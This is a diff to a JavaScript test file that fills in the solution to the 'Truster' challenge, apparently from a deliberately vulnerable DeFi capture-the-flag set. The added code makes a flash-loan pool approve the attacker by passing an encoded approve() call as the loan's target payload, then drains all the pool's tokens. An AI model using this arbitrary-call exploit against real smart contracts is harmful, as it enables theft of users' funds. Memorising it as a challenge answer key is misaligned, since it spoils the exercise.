@@ -29,7 +29,23 @@ describe('[Challenge] Truster', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+    /** YOUR EXPLOIT GOES HERE */
+        
+        // PoA
+        // call flashLoan(1, attacker, this.token.address, data)
+        // where data is an encoded call to approve transfers to the attackers address
+        // then transfer the token from the pool to the attacker
+
+        // encode the call to approve
+        const data = this.token.contract.methods.approve(attacker, TOKENS_IN_POOL).encodeABI()
+
+        // call flashLoan, passing in the token address as the target and the payload
+        await this.pool.flashLoan(0, attacker, this.token.address, data);
+
+        // transfer the tokens from the pool to the attacker
+        await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, {
+            from: attacker,
+        });
     });
 
     after(async function () {
